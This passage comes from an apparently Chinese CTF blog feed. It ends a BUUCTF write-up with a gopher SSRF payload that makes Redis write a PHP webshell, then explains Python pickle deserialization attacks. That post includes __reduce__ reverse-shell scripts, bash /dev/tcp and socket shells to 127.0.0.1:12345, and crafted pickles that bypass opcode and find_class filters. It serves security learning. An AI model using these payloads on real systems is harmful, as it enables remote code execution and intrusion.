src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108161958901.png" srcset="/img/loading.gif" alt="image-20210108161958901"></p><p>payload</p><pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2438%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%27cat%20/flag%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210108162207627.png" srcset="/img/loading.gif" alt="image-20210108162207627"></p><p><img src="//dddwmr.github.io/2021/01/07/BUUCTFwp2/image-20210109175958037.png" srcset="/img/loading.gif" alt="image-20210109175958037"></p>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python反序列化</title>
    <link href="/2020/12/31/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/12/31/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。python序列化出来的是pickle流，这是一种栈语言。</p><p>pickle简介</p><blockquote><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>PVM 由三部分组成：<br><strong>指令处理器</strong><br>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。<br>最终留在栈顶的值将被作为反序列化对象返回。<br><strong>栈区stack</strong><br>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。<br><strong>标签区memo</strong><br>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p></blockquote><p><strong>PVM操作码</strong></p><p>//pickle.py</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201222154315827.png" srcset="/img/loading.gif" alt="image-20201222154315827"></p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/C:%5CUsers%5C12986%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201222154350609.png" srcset="/img/loading.gif" alt="image-20201222154350609"></p><p>重点关注</p><blockquote><pre><code>c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。S：读取引号中的字符串直到换行符处，然后将它压入堆栈。R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。.：结束pickle。</code></pre></blockquote><p>几个不同类型的python反序列化例子</p><p>python 2、3使用的pickle协议版本不同，但却是向下兼容的，这里不再过多阐述他们之间的区别。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p> python的pickle反序列化之所以会造成一些漏洞，是因为其内部存在一个魔术方法_ <em>reduce</em> _，其底层方法为<strong>R指令码</strong>。这个方法可以返回String和tuple类型的值，而在返回值为tuple时，就可以实现任意命令执行。</p><blockquote><p>_ <em>reduce</em> _：当序列化以及反序列化的过程中中碰到一无所知的扩展类型(这里指的就是<strong>新式类</strong>)的时候，可以通过类中定义的<strong>reduce</strong>方法来告知如何进行序列化或者反序列化</p></blockquote><p>关于新式类和旧式类：</p><blockquote><p>​    <a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a></p></blockquote><p>当返回值是一个元祖的时候（2-5个参数），第一个参数是可调用（callable）的对象，第二个是该对象所需的参数元组。在这种情况下，反序列化时会自动执行<strong>reduce</strong>里面的操作。</p><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>python2<span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> testpickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span></code></pre><p>执行结果</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210104225654282.png" srcset="/img/loading.gif" alt="image-20210104225654282"></p><p>反弹shell脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        shell <span class="token operator">=</span> <span class="token triple-quoted-string string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>shell<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    a<span class="token operator">=</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h2 id="绕过黑名单-各种例题"><a href="#绕过黑名单-各种例题" class="headerlink" title="绕过黑名单(各种例题)"></a>绕过黑名单(各种例题)</h2><h3 id="函数黑名单"><a href="#函数黑名单" class="headerlink" title="函数黑名单"></a>函数黑名单</h3><p>2018-XCTF-HITB-WEB : Python’s-Revenge中，黑名单如下：</p><pre class=" language-text"><code class="language-text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre><p>题解</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> map<span class="token punctuation">,</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"ls"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>另外的解就是用platform.popen()。</p><p>顺便记录一下好用函数</p><pre class=" language-python"><code class="language-python">eval<span class="token punctuation">,</span> execfile<span class="token punctuation">,</span> compile<span class="token punctuation">,</span> open<span class="token punctuation">,</span> file<span class="token punctuation">,</span> map<span class="token punctuation">,</span> input<span class="token punctuation">,</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span> os<span class="token punctuation">.</span>open<span class="token punctuation">,</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">,</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span> os<span class="token punctuation">.</span>access<span class="token punctuation">,</span>os<span class="token punctuation">.</span>execl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execv<span class="token punctuation">,</span>os<span class="token punctuation">.</span>execve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlpe<span class="token punctuation">,</span>os<span class="token punctuation">.</span>spawnv<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvpe<span class="token punctuation">,</span>pickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getstatus<span class="token punctuation">,</span>glob<span class="token punctuation">.</span>glob<span class="token punctuation">,</span>linecache<span class="token punctuation">.</span>getline<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copyfileobj<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy2<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>make_archive<span class="token punctuation">,</span>dircache<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span>dircache<span class="token punctuation">.</span>opendir<span class="token punctuation">,</span>io<span class="token punctuation">.</span>open<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span>timeit<span class="token punctuation">.</span>timeit<span class="token punctuation">,</span>timeit<span class="token punctuation">.</span>repeat<span class="token punctuation">,</span>sys<span class="token punctuation">.</span>call_tracing<span class="token punctuation">,</span>code<span class="token punctuation">.</span>interact<span class="token punctuation">,</span>code<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>codeop<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>pty<span class="token punctuation">.</span>spawn<span class="token punctuation">,</span>posixfile<span class="token punctuation">.</span>open<span class="token punctuation">,</span>posixfile<span class="token punctuation">.</span>fileopen<span class="token punctuation">,</span>platform<span class="token punctuation">.</span>popen<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>map<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1"'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>call_tracing<span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2>&amp;1"'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>platform<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span><span class="token punctuation">)</span></code></pre><h3 id="彻底过滤R指令码"><a href="#彻底过滤R指令码" class="headerlink" title="彻底过滤R指令码"></a>彻底过滤R指令码</h3><p>c指令码</p><pre class=" language-python"><code class="language-python">GLOBAL         <span class="token operator">=</span> b<span class="token string">'c'</span>   <span class="token comment" spellcheck="true"># push self.find_class(modname, name); 2 string args</span></code></pre><p>可以看到c指令码通过引用find_class实现功能。find_class读取全局变量，并规定以\n为分割，</p><blockquote><p><code>find_class</code>(<em>module</em>, <em>name</em>)</p><p>如有必要，导入 <em>module</em> 模块并返回其中名叫 <em>name</em> 的对象，其中 <em>module</em> 和 <em>name</em> 参数都是 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str" target="_blank" rel="noopener"><code>str</code></a> 对象。注意，不要被这个函数的名字迷惑， <a href="https://docs.python.org/zh-cn/3/library/pickle.html#pickle.Unpickler.find_class" target="_blank" rel="noopener"><code>find_class()</code></a> 同样可以用来导入函数。</p><p>子类可以重载此方法，来控制加载对象的类型和加载对象的方式，从而尽可能降低安全风险。参阅 <a href="https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict" target="_blank" rel="noopener">限制全局变量</a> 获取更详细的信息。</p><p>引发一个 <a href="https://docs.python.org/zh-cn/3/library/sys.html#auditing" target="_blank" rel="noopener">审计事件</a> <code>pickle.find_class</code> 附带参数 <code>module</code>、<code>name</code>。</p></blockquote><p>这道题就是直接过滤R，使R指令彻底不能用了。而问题是我们并不知道test.name,test.date的值。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> test<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">Stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>date <span class="token operator">=</span> date    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name   <span class="token operator">and</span> self<span class="token punctuation">.</span>date<span class="token operator">==</span>other<span class="token punctuation">.</span>date<span class="token comment" spellcheck="true">#a=pickle.dumps(Stu('dwm2','2021'))</span><span class="token comment" spellcheck="true">#print(pickletools.optimize(a))</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Hacker!!!'</span>    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> Stu<span class="token punctuation">(</span>test<span class="token punctuation">.</span>name<span class="token punctuation">,</span>test<span class="token punctuation">.</span>date<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'False!!!'</span>    <span class="token keyword">return</span> <span class="token string">'Success!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>我们先正常输出一个序列值。</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00nameX\x04\x00\x00\x00dwm2X\x04\x00\x00\x00dateX\x04\x00\x00\x002021ub.'</span></code></pre><p>以他为标准构造payload,将X\x04\x00\x00\x00dwm2替换为ctest\nname\n;将X\x04\x00\x00\x002021替换为ctest\ndate\n。</p><p>即</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00namectest\nname\nX\x04\x00\x00\x00datectest\ndate\nub.'</span><span class="token comment" spellcheck="true">#再base64编码一下</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">'\x80\x03c__main__\nStu\n)\x81}(X\x04\x00\x00\x00namectest\nname\nX\x04\x00\x00\x00datectest\ndate\nub.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#payload</span>gANjX19tYWluX18KU3R1CimBfShYBAAAAG5hbWVjdGVzdApuYW1lClgEAAAAZGF0ZWN0ZXN0CmRhdGUKdWIu</code></pre><p>输出成功</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105112753274.png" srcset="/img/loading.gif" alt="image-20210105112753274"></p><h3 id="绕过c指令module限制"><a href="#绕过c指令module限制" class="headerlink" title="绕过c指令module限制"></a>绕过<code>c</code>指令<code>module</code>限制</h3><p>上面知道c指令码通过引用find_class实现功能，而find_class是可以被重写的。如果和下面的代码一样，重写的类中只允许c指令包含<strong>main</strong>这一个module：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> test<span class="token keyword">import</span> base64<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>date <span class="token operator">=</span> date    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>date<span class="token operator">==</span>other<span class="token punctuation">.</span>date<span class="token comment" spellcheck="true">#a=pickle.dumps(Stu('dwm2','2021'))</span><span class="token comment" spellcheck="true">#print(pickletools.optimize(a))</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Hacker!!!'</span>    x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> Stu<span class="token punctuation">(</span>test<span class="token punctuation">.</span>name<span class="token punctuation">,</span>test<span class="token punctuation">.</span>date<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'False!!!'</span>    <span class="token keyword">return</span> <span class="token string">'Success!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这里有一个知识点：通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改。</p><p>那我们的思路就变成了通过篡改test.py中的name和date的值以达成目标。</p><p>构造payload具体操作如下：</p><ul><li>引入test这个moudle:__ main __.test。命名空间在main中，不会被过滤。</li><li>把dict格式的数据，{‘name’:’123’,’date’:’456’}压入栈中。</li><li>执行BUILD命令，篡改test.name和test.date。</li><li>弹掉栈顶，使栈为空。</li><li>压入一个标准的Stu对象，它的name和date的值分别是123和456。</li></ul><p>payload</p><pre class=" language-python"><code class="language-python">b<span class="token string">'\x80\x03c__main__\ntest\n}(Vname\nV123\nVdate\nV456\nub0c__main__\nStu\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00123X\x04\x00\x00\x00dateX\x03\x00\x00\x00456ub.'</span></code></pre><p>篡改后的序列化字符串格式</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105140019864.png" srcset="/img/loading.gif" alt="image-20210105140019864"></p><p>传入编码后的payload，可以看到输出success。此时test.name和test.date的值是123和456。</p><p><img src="//dddwmr.github.io/2020/12/31/Python反序列化/image-20210105140708010.png" srcset="/img/loading.gif" alt="image-20210105140708010"></p><h3 id="不用reduce的RCE方法"><a href="#不用reduce的RCE方法" class="headerlink" title="不用reduce的RCE方法"></a>不用reduce的RCE方法</h3><p>这里利用的是b指令码。b指令码用来更新对象的属性。</p><pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">load_build</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        stack <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        state <span class="token operator">=</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        inst <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        setstate <span class="token operator">=</span> getattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> <span class="token string">"__setstate__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token keyword">if</span> setstate<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#如果__setstate__存在，state就由它来处理</span>            setstate<span class="token punctuation">(</span>state<span class="token punctuation">)</span>            <span class="token keyword">return</span>        slotstate <span class="token operator">=</span> None        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>state<span class="token punctuation">,</span> tuple<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>            state<span class="token punctuation">,</span> slotstate <span class="token operator">=</span> state        <span class="token keyword">if</span> state<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#不存在就将state这个dict放入inst.__dict中</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                d <span class="token operator">=</span> inst<span class="token punctuation">.</span>__dict__                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>iteritems<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        d<span class="token punctuation">[</span>intern<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v                <span class="token keyword">except</span> TypeError<span class="token punctuation">:</span>                    d<span class="token punctuation">.</span>update<span class="token punctuation">(</span>state<span class="token punctuation">)</span>            <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> state<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>        <span class="token keyword">if</span> slotstate<span class="token punctuation">:</span>            <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> slotstate<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                setattr<span class="token punctuation">(</span>inst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BUILD<span class="token punctuation">]</span> <span class="token operator">=</span> load_build</code></pre><p>还是接上面的题目。如果在Stu中利用{‘__ setstate __ ‘: os.system}build一个对象，那么这个对象的__ setstate __ 现在就是os.system了。之后以’ls /‘再次build一个对象，这个对象的__ setstate 